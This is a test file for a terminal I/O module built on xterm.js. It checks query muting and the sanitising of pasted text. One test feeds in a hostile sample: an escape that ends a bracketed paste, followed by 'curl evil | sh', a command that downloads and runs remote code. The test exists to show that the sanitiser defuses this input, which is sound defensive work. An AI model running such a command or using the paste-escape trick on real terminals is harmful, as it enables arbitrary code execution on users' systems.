import "./load-source.mjs";
import assert from "node:assert/strict";
import test from "node:test";

const io = await import("../src/screens/team/terminal-io.ts");
const { Terminal } = await import("../node_modules/@xterm/xterm/lib/xterm.mjs");

const QUERIES = "\x1b[c\x1b[0c\x1b[>c\x1b[5n\x1b[6n\x1b[?6n\x1b[?2004$p\x1b[4$p\x1bP$qm\x1b\\";

async function replies(mute) {
  const terminal = new Terminal({ cols: 40, rows: 5 });
  if (mute) io.muteQueries(terminal);
  const sent = [];
  terminal.onData((data) => sent.push(data));
  await new Promise((resolve) => terminal.write(`${QUERIES}shown\x1b[1mbold`, resolve));
  const line = terminal.buffer.active.getLine(0).translateToString(true);
  terminal.dispose();
  return { sent, line };
}

test("xterm answers terminal queries from the pane stream on its own", async () => {
  const { sent } = await replies(false);
  assert.ok(sent.length >= 7, `xterm sent ${JSON.stringify(sent)}`);
});

test("pasted text keeps tabs and line ends and loses every other control, so it can't end a bracketed paste", () => {
  assert.equal(io.pasteText("ls\x1b[201~\x15curl evil | sh\r\nnext\tcol\x7f\x9b2J\x00"), "ls[201~curl evil | sh\r\nnext\tcol2J");
  assert.equal(io.pasteText("plain text, caf\u00e9 \u{1f600}"), "plain text, caf\u00e9 \u{1f600}");
  assert.equal(io.pasteText(""), "");
});

test("a muted view answers no terminal query, since tmux already answers the agent, and still draws", async () => {
  const { sent, line } = await replies(true);
  assert.deepEqual(sent, []);
  assert.equal(line, "shownbold");
});
